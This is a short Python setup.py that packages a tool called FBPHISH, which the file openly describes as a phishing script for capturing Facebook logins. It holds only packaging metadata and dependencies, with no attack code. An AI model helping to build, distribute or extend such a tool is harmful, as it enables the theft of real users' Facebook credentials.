#!/usr/bin/env python

from setuptools import setup

version = open("files/version.txt").read().strip()
long_description = open("README.md").read().strip()

setup(
    name='FBPHISH',
    version=version,
    description='A python phishing script for facebook login phishing.',
    long_description=long_description,
    long_description_content_type='text/markdown',
    author='Israfil Miya',
    author_email='israfilmiya120@gmail.com',
    license="MIT",
    url='https://github.com/GitPro10/FBPHISH/',
    scripts=['fb_phish'],
    install_requires=["requests", "bs4", "rich"]
)
